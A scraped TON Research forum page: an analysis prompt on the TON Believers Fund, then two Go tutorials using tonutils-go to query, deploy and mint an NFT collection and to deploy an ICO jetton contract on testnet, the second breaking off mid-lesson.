The TON (Telegram Open Network) blockchain community has recently witnessed the introduction of the TON Believers Fund and the associated Locker smart contract. This initiative, which allows TON holders to lock their coins for a total of 5 years (2 years of lockup and 3 years of vesting), has culminated in the locking of approximately 1.3 billion TON coins, representing about 25% of the entire TON supply. This significant event in TON’s ecosystem presents various aspects that require detailed analysis to understand its broader impact on the tokenomics and market dynamics of the TON network.

This inquiry seeks to analyze the TON Believers Fund and Locker smart contract, focusing on several key aspects:

1.  **Mechanics and Structure of the Locker Smart Contract**: Can you elaborate on the operational mechanics of the Locker smart contract, including the processes for making deposits and donations, and the phases involved in the lockup and vesting of TON coins?
2.  **Impact on TON’s Circulating Supply**: How does the locking of a substantial portion of TON’s total supply (1.3 billion TON) impact the circulating supply and, consequently, the market dynamics and price of TON coins?
3.  **Incentive Structure for Long-term Holders**: What incentives are offered to TON holders for participating in this lockup, and how does this compare to traditional banking deposits and other cryptocurrency staking mechanisms?
4.  **Implications for TON’s Tokenomics**: How does the TON Believers Fund initiative contribute to the predictability, clarity, and transparency of TON’s tokenomics, and what are the potential long-term effects on the TON ecosystem?
5.  **Community Participation and Trust**: What does the success of the TON Believers Fund, in terms of the amount of TON locked, indicate about community trust and commitment to the Toncoin project?
6.  **Risks and Challenges Associated with the Locker Smart Contract**: Are there any potential risks or challenges for participants in this initiative, particularly in terms of smart contract security, liquidity concerns, or market volatility?
7.  **Comparative Analysis with Other Blockchain Initiatives**: How does the TON Believers Fund and Locker smart contract compare with similar initiatives in other blockchain ecosystems, in terms of scale, community engagement, and impact on the respective token economies?

This analysis aims to provide a comprehensive understanding of the TON Believers Fund and the associated Locker smart contract, exploring its implications for TON’s tokenomics, market dynamics, and the overall health and stability of the TON ecosystem.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 450

[TON Research](/)

# [Golang Scripts - convenient scripts for working with TON - Lesson 2 NFT collection creation](/t/golang-scripts-convenient-scripts-for-working-with-ton-lesson-2-nft-collection-creation/450)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 3:27pm  1

# [](#nft-collection-deploy-1)NFT collection deploy

## [](#introduction-2)Introduction

In this tutorial, we will deploy an NFT collection using the tonutils-go library. In order for the lesson to qualitatively cover the topic of deploying an NFT collection, we will do the following, first we will make requests to an existing collection, thus we will get examples of what can be stored in an NFT collection and its element. And then we will create our own NFT collection (quite a test one without any sense).

Before proceeding to the lesson, I advise you to watch the previous lesson in order to understand how a wallet is created and contracts are deployed.

## [](#get-information-about-the-collection-and-an-individual-element-3)Get information about the Collection and an individual element

Getting information about the collection involves making GET requests to the smart contract. In this lesson, we will consider obtaining information from smart contracts that comply with the standards. Lesson with analysis of the NFT standard [here](https://github.com/romanovichim/TonFunClessons_ru/blob/main/10lesson/tenthlesson.md). The standard itself can be found [here](https://github.com/ton-blockchain/TIPs/issues/62).

### [](#what-information-can-be-taken-according-to-the-nft-collection-standard-4)What information can be taken according to the NFT collection standard

A collection smart contract that conforms to the standard must implement the Get method `get_collection_data()` , which will return the address of the collection owner, the content of the collection, and the count of current NFTs in the collection. The function looks like this:

```
(int, cell, slice) get_collection_data() method_id {
  var (owner_address, next_item_index, content, _, _) = load_data();
  slice cs = content.begin_parse();
  return (next_item_index, cs~load_ref(), owner_address);
}
```

> load\_data() unloads data from register c4

If we were just executing a request to the contract, we would have to “parse” the slice and other unpleasant things related to types. In `tonutils-go`, there is a `GetCollectionData` function that will allow you not to bother with this, which is what we will use next.

For example, let’s take some collection from some marketplace and just check the information that we get and the information from the marketplace.

The address of the collection that I will use in this tutorial:

```
EQAA1yvDaDwEK5vHGOXRdtS2MbOVd1-TNy01L1S_t2HF4oLu
```

Judging by the information from the marketplace, there are 13333 items in the collection at this address, let’s check it out

### [](#getting-information-about-the-nft-collection-using-go-5)Getting information about the NFT collection using GO

Connect to lightserves on the main network:

```
func main() {

	client := liteclient.NewConnectionPool()
	configUrl := "https://ton-blockchain.github.io/global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}

	api := ton.NewAPIClient(client)

}
```

> This collection is also in the test network, so if you take the test network config, everything will also work

Take the address and use the `GetCollectionData` function to call the get\_collection\_data() method and convert the data to readable

> Before calling `GetCollectionData` you need to set the `NewCollectionClient` connection

```
func main() {
	client := liteclient.NewConnectionPool()
	configUrl := "https://ton-blockchain.github.io/global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}

	api := ton.NewAPIClient(client)

	nftColAddr := address.MustParseAddr("EQAA1yvDaDwEK5vHGOXRdtS2MbOVd1-TNy01L1S_t2HF4oLu")


	// get info about our nft's collection
	collection := nft.NewCollectionClient(api, nftColAddr)
	collectionData, err := collection.GetCollectionData(context.Background())
	if err != nil {
		panic(err)
	}
}
```

Now `collectionData` stores information about the collection, we will output data from `collectionData` to the console using the `fmt` library.

It should output the following information:

```
Collection addr      : EQAA1yvDaDwEK5vHGOXRdtS2MbOVd1-TNy01L1S_t2HF4oLu
	content          : http://nft.animalsredlist.com/nfts/collection.json
	owner            : EQANKN8ZnM0OzYOENTkOEg7VVgFog5fBWdCtqQro1MRmU5_2
	minted items num : 13333
```

As we can see the information converge, there are also 13333 items in the collection.

Final `nftcoldata.go` code:

```
package main

import (
	"context"
	"fmt"

	"github.com/xssnick/tonutils-go/address"
	"github.com/xssnick/tonutils-go/liteclient"
	"github.com/xssnick/tonutils-go/ton"
	"github.com/xssnick/tonutils-go/ton/nft"
)

func main() {
	client := liteclient.NewConnectionPool()
	configUrl := "https://ton-blockchain.github.io/global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}

	api := ton.NewAPIClient(client)

	nftColAddr := address.MustParseAddr("EQAA1yvDaDwEK5vHGOXRdtS2MbOVd1-TNy01L1S_t2HF4oLu")

	// get info about our nft's collection
	collection := nft.NewCollectionClient(api, nftColAddr)
	collectionData, err := collection.GetCollectionData(context.Background())
	if err != nil {
		panic(err)
	}

	fmt.Println("Collection addr      :", nftColAddr)
	fmt.Println("    content          :", collectionData.Content.(*nft.ContentOffchain).URI)
	fmt.Println("    owner            :", collectionData.OwnerAddress.String())
	fmt.Println("    minted items num :", collectionData.NextItemIndex)
}
```

## [](#what-information-can-be-obtained-from-a-single-nft-element-6)What information can be obtained from a single NFT element

Let’s say we want to get the address of the collection element, its content, let’s say a link to the picture. And everything seems to be simple, we pull the Get-method and get the information. BUT in \[according to the NFT standard in TON\] ([NFT Standard · Issue #62 · ton-blockchain/TIPs · GitHub](https://github.com/ton-blockchain/TIPs/issues/62)), in this way we will not get the full link, but only a part, the so-called individual element content.

To get the full content (address), you need:

*   by the get-method of the element `get_nft_data()`, we will get the element index and individual content, as well as the initialization sign
*   check if the element is initialized (More about this in lesson 10, where the NFT standard is discussed)
*   if the element is initialized, then by the get-method of the collection `get_nft_content(int index, cell individual_content)`, we get  
    full content (full address) on a single element

### [](#get-information-about-the-nft-element-using-go-7)Get information about the NFT element using GO

The address of the element that I will use below:

UQBzmkmGYAw3qNEQYddY-FjWRPJRjg7Vv2B1Dns3FrERcaRH

Let’s try to take information about this NFT element.

Establish connection with lightservers:

```
func main() {
	client := liteclient.NewConnectionPool()
	configUrl := "https://ton-blockchain.github.io/global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}

	api := ton.NewAPIClient(client)

}
```

Let’s call the get-method of the element `get_nft_data()` and output the received information to the console:

```
func main() {
	client := liteclient.NewConnectionPool()
	configUrl := "https://ton-blockchain.github.io/global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}

	api := ton.NewAPIClient(client)


	nftAddr := address.MustParseAddr("UQBzmkmGYAw3qNEQYddY-FjWRPJRjg7Vv2B1Dns3FrERcaRH")
	item := nft.NewItemClient(api, nftAddr)

	nftData, err := item.GetNFTData(context.Background())
	if err != nil {
		panic(err)
	}

	fmt.Println("NFT addr         :", nftAddr.String())
	fmt.Println("    initialized  :", nftData.Initialized)
	fmt.Println("    owner        :", nftData.OwnerAddress.String())
	fmt.Println("    index        :", nftData.Index)
	
}
```

In addition to the information that we displayed, we also have information about the collection, we can get it using the following code:

```
	// get info about our nft's collection
	collection := nft.NewCollectionClient(api, nftData.CollectionAddress)
```

It remains to check if the element is initialized and call the get-method of the collection `get_nft_content(int index, cell individual_content)` to get a reference to the element.

```
// get info about our nft's collection
collection := nft.NewCollectionClient(api, nftData.CollectionAddress)

	if nftData.Initialized {
		// get full nft's content url using collection method that will merge base url with nft's data
		nftContent, err := collection.GetNFTContent(context.Background(), nftData.Index, nftData.Content)
		if err != nil {
			panic(err)
		}
		fmt.Println("    part content :", nftData.Content.(*nft.ContentOffchain).URI)
		fmt.Println("    full content :", nftContent.(*nft.ContentOffchain).URI)
	} else {
		fmt.Println("    empty content")
	}
```

Final `nftitemdata.go` code:

```
func main() {
	client := liteclient.NewConnectionPool()
	configUrl := "https://ton-blockchain.github.io/global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}

	api := ton.NewAPIClient(client)


	nftAddr := address.MustParseAddr("UQBzmkmGYAw3qNEQYddY-FjWRPJRjg7Vv2B1Dns3FrERcaRH")
	item := nft.NewItemClient(api, nftAddr)

	nftData, err := item.GetNFTData(context.Background())
	if err != nil {
		panic(err)
	}

	fmt.Println("NFT addr         :", nftAddr.String())
	fmt.Println("    initialized  :", nftData.Initialized)
	fmt.Println("    owner        :", nftData.OwnerAddress.String())
	fmt.Println("    index        :", nftData.Index)

	// get info about our nft's collection
	collection := nft.NewCollectionClient(api, nftData.CollectionAddress)

	if nftData.Initialized {
		// get full nft's content url using collection method that will merge base url with nft's data
		nftContent, err := collection.GetNFTContent(context.Background(), nftData.Index, nftData.Content)
		if err != nil {
			panic(err)
		}
		fmt.Println("    part content :", nftData.Content.(*nft.ContentOffchain).URI)
		fmt.Println("    full content :", nftContent.(*nft.ContentOffchain).URI)
	} else {
		fmt.Println("    empty content")
	}
}
```

As a result, you should get the following element: [https://nft.animalsredlist.com/nfts/11030.json](https://nft.animalsredlist.com/nfts/11030.json)

## [](#deploy-smart-contract-collection-8)Deploy smart contract collection

After we learned how to look at information about other people’s collections and elements, we will try to deploy our collection and element in the test network. Before moving on, I advise you to go through the previous lesson, since I will not dwell on how to create a wallet, create a hexBOC contract form and deploy a contract to a test network here.

Let’s analyze what is needed to deploy the collection. The first thing we need is the hexBOC representation of the contract, the second is the initial data for the `c4` register.

Let’s start with the second, according to the standard, we will determine the data that needs to be put in `c4`. It is convenient to look at the function that loads data from the [collection contract](https://github.com/ton-blockchain/token-contract/blob/main/nft/nft-collection.fc) example.

```
(slice, int, cell, cell, cell) load_data() inline {
  var ds = get_data().begin_parse();
  return 
	(ds~load_msg_addr(), ;; owner_address
	 ds~load_uint(64), ;; next_item_index
	 ds~load_ref(), ;; content
	 ds~load_ref(), ;; nft_item_code
	 ds~load_ref()  ;; royalty_params
	 );
}
```

Let the address of the owner be the address of the wallet that we will use for deployment, so we will pass the address to the function as an argument:

```
func getContractData(collectionOwnerAddr, royaltyAddr *address.Address) *cell.Cell {

}
```

It is also necessary to transfer the royalty-free address, which we will transfer in the royalty parameters. In this example, we won’t be setting any royalty values, so we’ll pass in zeros. (You can read about the piano parameters [here](https://github.com/ton-blockchain/TEPs/blob/afb3b967db3cf693f1b667f771150056d53944d5/text/0066-nft-royalty-standard.md))

```
func getContractData(collectionOwnerAddr, royaltyAddr *address.Address) *cell.Cell {

	royalty := cell.BeginCell().
		MustStoreUInt(0, 16).
		MustStoreUInt(0, 16).
		MustStoreAddr(royaltyAddr).
		EndCell()

}
```

Now let’s collect the content part, it is divided into two cells `collection_content` and `common_content` in accordance with the standard:

```
func getContractData(collectionOwnerAddr, royaltyAddr *address.Address) *cell.Cell {
	royalty := cell.BeginCell().
		MustStoreUInt(0, 16).
		MustStoreUInt(0, 16).
		MustStoreAddr(royaltyAddr).
		EndCell()

	collectionContent := nft.ContentOffchain{URI: "https://tonutils.com"}
	collectionContentCell, _ := collectionContent.ContentCell()

	commonContent := nft.ContentOffchain{URI: "https://tonutils.com/nft/"}
	commonContentCell, _ := commonContent.ContentCell()

	contentRef := cell.BeginCell().
		MustStoreRef(collectionContentCell).
		MustStoreRef(commonContentCell).
		EndCell()

}
```

The index will be equal to zero, and for the code we will create a separate function `getNFTItemCode()`, which will simply store the contract code of a separate element in hexBOC format. As a result, we get:

```
func getContractData(collectionOwnerAddr, royaltyAddr *address.Address) *cell.Cell {

	royalty := cell.BeginCell().
		MustStoreUInt(0, 16).
		MustStoreUInt(0, 16).
		MustStoreAddr(royaltyAddr).
		EndCell()

	collectionContent := nft.ContentOffchain{URI: "https://tonutils.com"}
	collectionContentCell, _ := collectionContent.ContentCell()

	commonContent := nft.ContentOffchain{URI: "https://tonutils.com/nft/"}
	commonContentCell, _ := commonContent.ContentCell()

	contentRef := cell.BeginCell().
		MustStoreRef(collectionContentCell).
		MustStoreRef(commonContentCell).
		EndCell()

	data := cell.BeginCell().MustStoreAddr(collectionOwnerAddr).
		MustStoreUInt(0, 64).
		MustStoreRef(contentRef).
		MustStoreRef(getNFTItemCode()).
		MustStoreRef(royalty).
		EndCell()

	return data
}
```

It remains only to deploy the contract:

```
addr, err := w.DeployContract(context.Background(), tlb.MustFromTON("0.02"),
	msgBody, getNFTCollectionCode(), getContractData(w.Address(), nil), true)
if err != nil {
	panic(err)
}
```

Full code [here](https://github.com/xssnick/tonutils-go/blob/master/example/deploy-nft-collection/main.go).

## [](#mint-element-to-collection-9)Mint element to collection

Adding an element to a collection is called mint. If you look at the [collection contract example](https://github.com/ton-blockchain/token-contract/blob/main/nft/nft-collection.fc) you can see that in order to mint a new NFT item, you need to send internal message.

Respectively:

*   Call the get-method of the collection `get_collection_data()` to get the index we need for the mint
*   Call the collection’s get method `get_nft_address_by_index(int ​​index)` to get the address of the NFT element
*   Let’s collect the payload (Item index, wallet address, small amount of TON for , content)
*   Send a message to the smart contract address of the collection with our payload

Let’s start by connecting to light servers:

```
func main() {
	client := liteclient.NewConnectionPool()

	// connect to mainnet lite server
	err := client.AddConnection(context.Background(), "135.181.140.212:13206", "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw=")
	if err != nil {
		panic(err)
	}

	// initialize ton api lite connection wrapper
	api := ton.NewAPIClient(client)

}
```

We “collect” the wallet, and make a call to `get_collection_data()` to get the index:

```
func main() {
	client := liteclient.NewConnectionPool()

	// connect to mainnet lite server
	err := client.AddConnection(context.Background(), "135.181.140.212:13206", "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw=")
	if err != nil {
		panic(err)
	}

	// initialize ton api lite connection wrapper
	api := ton.NewAPIClient(client)
	w := getWallet(api)

	collectionAddr := address.MustParseAddr("EQCSrRIKVEBaRd8aQfsOaNq3C4FVZGY5Oka55A5oFMVEs0lY")
	collection := nft.NewCollectionClient(api, collectionAddr)

	collectionData, err := collection.GetCollectionData(context.Background())
	if err != nil {
		panic(err)
	}
}
```

> It is important to use the wallet, the address that we put in `c4` when deploying the collection contract, otherwise when minting, an error will occur, since the contract has a check for the address from which you can mint (It looks like this: `throw_unless(401, equal_slices(sender_address, owner_address));`).

Now get the element’s address by calling the collection’s get method `get_nft_address_by_index(int index)` to get the element’s NFT address and prepare the payload:

```
func main() {
	client := liteclient.NewConnectionPool()

	// connect to mainnet lite server
	err := client.AddConnection(context.Background(), "135.181.140.212:13206", "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw=")
	if err != nil {
		panic(err)
	}

	// initialize ton api lite connection wrapper
	api := ton.NewAPIClient(client)
	w := getWallet(api)

	collectionAddr := address.MustParseAddr("EQCSrRIKVEBaRd8aQfsOaNq3C4FVZGY5Oka55A5oFMVEs0lY")
	collection := nft.NewCollectionClient(api, collectionAddr)

	collectionData, err := collection.GetCollectionData(context.Background())
	if err != nil {
		panic(err)
	}

	nftAddr, err := collection.GetNFTAddressByIndex(context.Background(), collectionData.NextItemIndex)
	if err != nil {
		panic(err)
	}

	mintData, err := collection.BuildMintPayload(collectionData.NextItemIndex, w.Address(), tlb.MustFromTON("0.01"), &nft.ContentOffchain{
		URI: fmt.Sprint(collectionData.NextItemIndex) + ".json",
	})
	if err != nil {
		panic(err)
	}
}
```

The only thing left is to send a message from the wallet to the smart contract of the collection and display data about our element (check that everything went right by calling the get-method `get_nft_data()` - let’s see if the correct information comes in).

```
func main() {
	client := liteclient.NewConnectionPool()

	// connect to mainnet lite server
	err := client.AddConnection(context.Background(), "135.181.140.212:13206", "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw=")
	if err != nil {
		panic(err)
	}

	// initialize ton api lite connection wrapper
	api := ton.NewAPIClient(client)
	w := getWallet(api)

	collectionAddr := address.MustParseAddr("EQCSrRIKVEBaRd8aQfsOaNq3C4FVZGY5Oka55A5oFMVEs0lY")
	collection := nft.NewCollectionClient(api, collectionAddr)

	collectionData, err := collection.GetCollectionData(context.Background())
	if err != nil {
		panic(err)
	}

	nftAddr, err := collection.GetNFTAddressByIndex(context.Background(), collectionData.NextItemIndex)
	if err != nil {
		panic(err)
	}

	mintData, err := collection.BuildMintPayload(collectionData.NextItemIndex, w.Address(), tlb.MustFromTON("0.01"), &nft.ContentOffchain{
		URI: fmt.Sprint(collectionData.NextItemIndex) + ".json",
	})
	if err != nil {
		panic(err)
	}

	fmt.Println("Minting NFT...")
	mint := wallet.SimpleMessage(collectionAddr, tlb.MustFromTON("0.025"), mintData)

	err = w.Send(context.Background(), mint, true)
	if err != nil {
		panic(err)
	}

	fmt.Println("Minted NFT:", nftAddr.String(), 0)

	newData, err := nft.NewItemClient(api, nftAddr).GetNFTData(context.Background())
	if err != nil {
		panic(err)
	}

	fmt.Println("Minted NFT addr: ", nftAddr.String())
	fmt.Println("NFT Owner:", newData.OwnerAddress.String())
}
```

Full code [here](https://github.com/xssnick/tonutils-go/blob/master/example/nft-mint/main.go).

## [](#exercise-10)Exercise

Deploy your collection and create an NFT item on the testnet, then try to get the information about the collection and the item with the scripts from the beginning of the lesson.

## [](#conclusion-11)Conclusion

I publish new lessons [here](https://t.me/ton_learn), on the [main page](https://github.com/romanovichim/TonFunClessons_ru) there is an address for donations, if you suddenly want to help release new lessons. Separately, I want to thank the developers [GitHub - xssnick/tonutils-go: TON SDK Library in pure Golang for interacting with The Open Network ecosystem using native protocols, such as ADNL, RLDP and etc.](https://github.com/xssnick/tonutils-go) who are doing a great job.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/15lesson/NFTCollectionDeploy_eng.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/golang/15lesson/NFTCollectionDeploy\_eng.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/15lesson/NFTCollectionDeploy_eng.md)

```
#  NFT collection deploy

## Introduction

In this tutorial, we will deploy an NFT collection using the tonutils-go library. In order for the lesson to qualitatively cover the topic of deploying an NFT collection, we will do the following, first we will make requests to an existing collection, thus we will get examples of what can be stored in an NFT collection and its element. And then we will create our own NFT collection (quite a test one without any sense).

Before proceeding to the lesson, I advise you to watch the previous lesson in order to understand how a wallet is created and contracts are deployed.

## Get information about the Collection and an individual element

Getting information about the collection involves making GET requests to the smart contract. In this lesson, we will consider obtaining information from smart contracts that comply with the standards. Lesson with analysis of the NFT standard [here](https://github.com/romanovichim/TonFunClessons_ru/blob/main/10lesson/tenthlesson.md). The standard itself can be found [here](https://github.com/ton-blockchain/TIPs/issues/62).

### What information can be taken according to the NFT collection standard

A collection smart contract that conforms to the standard must implement the Get method `get_collection_data()` , which will return the address of the collection owner, the content of the collection, and the count of current NFTs in the collection. The function looks like this:

	(int, cell, slice) get_collection_data() method_id {
	  var (owner_address, next_item_index, content, _, _) = load_data();
	  slice cs = content.begin_parse();
	  return (next_item_index, cs~load_ref(), owner_address);
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/15lesson/NFTCollectionDeploy_eng.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 451

[TON Research](/)

# [Golang Scripts - convenient scripts for working with TON - Lesson 3 We issue our own tokens: ICO](/t/golang-scripts-convenient-scripts-for-working-with-ton-lesson-3-we-issue-our-own-tokens-ico/451)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 3:28pm  1

## [](#introduction-1)Introduction

## [](#what-is-an-ico-2)What is an ICO

ICO - Initial Coin Offering (initial placement of tokens) - issuance by any project or company of its own money - tokens (cryptocurrency) in order to attract investments.

### [](#why-ico-is-needed-3)Why ICO is needed

Conducting an ICO by a project allows you to provide it with funding, which is necessary for development, development and scaling. Usually, when conducting an ICO, it is assumed that the tokens will cost more over time. I note that “decent” projects, in their roadmaps, lay down various mechanics that do not allow the price of the token to fall sharply, provoking an even sharper price drop further.

If you are curious to understand how profitable ICOs are, then you can see the statistics on the ROI of ICO projects [here](https://icodrops.com/ico-stats/).

> Filter by USD ROI to see top projects.

### [](#important-risks-4)Important: Risks

Speaking about ICO, one cannot ignore the risks, in fact, when buying tokens, you buy records in the blockchain, the value of which is provided only by the token issuer project. On the technical side, a smart contract with which an ICO is carried out can be hacked or initially have a backdoor that will allow the owner of the smart contract to change the terms of the ICO, and of course, any project can scam, even if there was no initial goal of creating a scam.

## [](#overview-of-smart-contracts-5)Overview of smart contracts

In this tutorial, we will use the smart contract from the examples provided in the Jetton standard, namely the master contract `jetton-minter-ICO.fc` [from here](https://github.com/ton-blockchain/token-contract/tree/main/ft).

The essential difference between the master contract from the ninth lesson, which we analyzed in detail, is the presence of mechanics in this ICO smart contract, due to the following code in `recv_internal()`:

```
if (in_msg_body.slice_empty?()) { ;; buy jettons for Toncoin

	  int amount = 10000000; ;; for mint message
	  int buy_amount = msg_value - amount;
	  throw_unless(76, buy_amount > 0);

	  int jetton_amount = buy_amount; ;; rate 1 jetton = 1 toncoin; multiply to price here

	  var master_msg = begin_cell()
			.store_uint(op::internal_transfer(), 32)
			.store_uint(0, 64) ;; quert_id
			.store_coins(jetton_amount)
			.store_slice(my_address()) ;; from_address
			.store_slice(sender_address) ;; response_address
			.store_coins(0) ;; no forward_amount
			.store_uint(0, 1) ;; forward_payload in this slice, not separate cell
			.end_cell();

	  mint_tokens(sender_address, jetton_wallet_code, amount, master_msg);
	  save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code);
	  return ();
	}
```

As you can see, the exchange of Toncoin for tokens occurs when sending a message with an empty body. Accordingly, in this lesson we will do the following:

*   we will make two wallets: from one we will launch the master contract, from the second we will send a message with an empty body to receive tokens
*   deploy `jetton-minter-ICO.fc`
*   send a message from the second wallet with an empty body and some amount of Toncoin to be exchanged for tokens
*   check that the balance of tokens has changed

## [](#deploy-contracts-for-ico-to-testnet-6)Deploy contracts for ICO to testnet

> If you have gone through the previous lessons and remember them well, scroll through immediately to Deploy contracts

### [](#wallets-7)Wallets

The first thing to do is to create two wallets in TON w1 and w2, one of them will be the “administrator address” of the smart contract, the second one we will use to exchange test TONs for Jetton in the test network. (lesson about it [here](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/14lesson/wallet_eng.md))

`SeedPhrase.go` code:

```
package main

import (
	"context"
	"log"
	"fmt"

	"github.com/xssnick/tonutils-go/liteclient"
	"github.com/xssnick/tonutils-go/ton"
	"github.com/xssnick/tonutils-go/ton/wallet"
)

func main() {


	client := liteclient.NewConnectionPool()

	configUrl := "https://ton-blockchain.github.io/testnet-global.config.json"


	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}
	api := ton.NewAPIClient(client)

	seed1 := wallet.NewSeed()
	fmt.Println("Seed phrase one:")
	fmt.Println(seed1)

	w1, err := wallet.FromSeed(api, seed1, wallet.V3)
	if err != nil {
		log.Fatalln("FromSeed err:", err.Error())
		return
	}
	fmt.Println("Address one:")
	fmt.Println(w1.Address())

	seed2 := wallet.NewSeed()
	fmt.Println("Seed phrase two:")
	fmt.Println(seed2)

	w2, err := wallet.FromSeed(api, seed2, wallet.V3)
	if err != nil {
		log.Fatalln("FromSeed err:", err.Error())
		return
	}
	fmt.Println("Address two:")
	fmt.Println(w2.Address())

	block, err := api.CurrentMasterchainInfo(context.Background())
	if err != nil {
		log.Fatalln("CurrentMasterchainInfo err:", err.Error())
		return
	}

	balance1, err := w1.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance err:", err.Error())
		return
	}
	fmt.Println("Balance one:")
	fmt.Println(balance1)

	balance2, err := w2.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance err:", err.Error())
		return
	}
	fmt.Println("Balance two:")
	fmt.Println(balance2)

}
```

We save seed phrases somewhere, with the help of them we will use the wallet in other scripts, and also send test tones to both addresses using the bot: [Telegram: Contact @testgiver\_ton\_bot](https://t.me/testgiver_ton_bot)

A minute later, check that the funds came through: [https://testnet.tonscan.org/](https://testnet.tonscan.org/)

> Since wallet two will have to wait a while to replenish the second wallet.

We will use wallets with the help of the functions we wrote, as in previous lessons. Let’s use them to, for example, find out the balance.

`WalletFunC.go` code:

```
package main

import (
	"context"
	"log"
	"fmt"
	"strings"

	"github.com/xssnick/tonutils-go/liteclient"
	"github.com/xssnick/tonutils-go/ton"
	"github.com/xssnick/tonutils-go/ton/wallet"
)

func main() {


	client := liteclient.NewConnectionPool()

	configUrl := "https://ton-blockchain.github.io/testnet-global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}
	api := ton.NewAPIClient(client)

	w1 := getWallet1(api)
	w2 := getWallet2(api)


	fmt.Println(w1.Address())
	fmt.Println(w1.Address())
	block, err := api.CurrentMasterchainInfo(context.Background())
	if err != nil {
		log.Fatalln("CurrentMasterchainInfo err:", err.Error())
		return
	}


	balance1, err := w1.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance1 err:", err.Error())
		return
	}

	fmt.Println(balance1)

	balance2, err := w2.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance2 err:", err.Error())
		return
	}

	fmt.Println(balance2)

}



func getWallet1(api *ton.APIClient) *wallet.Wallet {
	words := strings.Split("your Seed phrase 1", " ")
	w, err := wallet.FromSeed(api, words, wallet.V3)
	if err != nil {
		panic(err)
	}
	return w
}

func getWallet2(api *ton.APIClient) *wallet.Wallet {
	words := strings.Split("your Seed phrase 2", " ")
	w, err := wallet.FromSeed(api, words, wallet.V3)
	if err != nil {
		panic(err)
	}
	return w
}
```

> Yes, you can make one function and pass parameters there, but this is done for ease of perception of the code

### [](#deploy-contracts-8)Deploy contracts

#### [](#create-a-hexboc-representation-of-contracts-9)Create a hexBoc representation of contracts

In the `tonutils-go` library, you can deploy a smart contract in the form of hexBoc. Boc is a serialized form of a smart contract (bag-of-cells). To convert a smart contract into a hexBoc form from func, you must first compile it into fift, and then get hexBoc with a separate fift script. This can be done using the familiar `toncli`. But first things first.

##### [](#building-jetton-minter-ico-and-jetton-wallet-code-10)Building jetton-minter-ICO and jetton-wallet code

We will take the func code from [examples](https://github.com/ton-blockchain/token-contract/tree/main/ft), we need `jetton-minter-ICO.fc` and `jetton-minter.fc` , as well as auxiliary ones:

*   `jetton-utils.fc`
*   `op-codes.fc`
*   `params.fc`

> For your convenience, I have compiled two amalgam codes (all in one file), see code files: `code-amalgama.func` and `codewallet-amalgama.func`

##### [](#get-fift-11)Get fift

Turn func code into fift using `toncli func build`

> In code, the resulting files are `contract` and `contractwallet`

##### [](#lets-print-hexboc-12)Let’s print hexBoc

Now the script that will translate the code into hexBOC format:

```
#!/usr/bin/fift -s
"TonUtil.fif" include
"Asm.fif" include

."first contract:" cr

"first.fif" include
2 boc+>B dup Bx. cr cr
```

I will not dwell on fift in detail, this is beyond the scope of this lesson, I will only note:

*   boc+>B - serializes to boc format
*   cr - displays the value in a string

> You can run the script either using the familiar toncli, namely `toncli fift run` , or as described [here](https://ton-blockchain.github.io/docs/#/compile?id=fift).

An example script is in the `print-hex.fif` file.

Outcome:

